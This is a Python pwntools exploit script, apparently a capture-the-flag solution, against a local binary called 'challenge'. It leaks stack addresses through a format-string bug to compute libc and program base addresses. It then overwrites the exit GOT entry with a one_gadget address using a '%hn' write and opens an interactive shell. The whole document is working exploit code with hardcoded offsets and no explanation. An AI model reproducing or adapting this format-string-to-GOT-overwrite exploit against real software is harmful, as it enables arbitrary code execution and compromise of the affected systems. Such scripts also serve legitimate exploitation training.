from pwn import *

r = process("./challenge")
r.sendline("-136")
#gdb.attach(r)
r.send("%11$pAAA" + "\x9d")
got = r.recv()
print(got)
libc_base = u64(got.split("AAA")[1] + "\x00"*2) - 0x2029d
elf_base = int(got.split("AAA")[0][2:], 16) - 0x8e5 - 0x50 + 0xf5 -0x40
log.info("libc_base: 0x{:x}".format(libc_base))
log.info("elf_base: 0x{:x}".format(elf_base))
# leak offset 0xdb910
# 0x39b788 free hook
# 0x201008 count variable offset
exit_got = elf_base + 0x201030
one = libc_base + 0xd6b9f
count_var = elf_base + 0x201008

log.info("exit_got: 0x{:x}".format(exit_got))
log.info("one: 0x{:x}".format(libc_base + 0x3f306))
log.info("one: 0x{:x}".format(libc_base + 0x3f35a))
log.info("one: 0x{:x}".format(libc_base + 0xd6b9f))
log.info("count var: 0x{:x}".format(count_var))
context.clear(arch='amd64')
writes = {
        exit_got: one
        }
payload = fmtstr_payload(5, writes, numbwritten=8)

print(payload)
print(len(payload))
#gdb.attach(r)
p = "%" + str(one & 0xffff) + "c%30$hn"
r.send( p + "\x00"*(192 - len(p)) + p64(exit_got)[:6])
r.interactive()
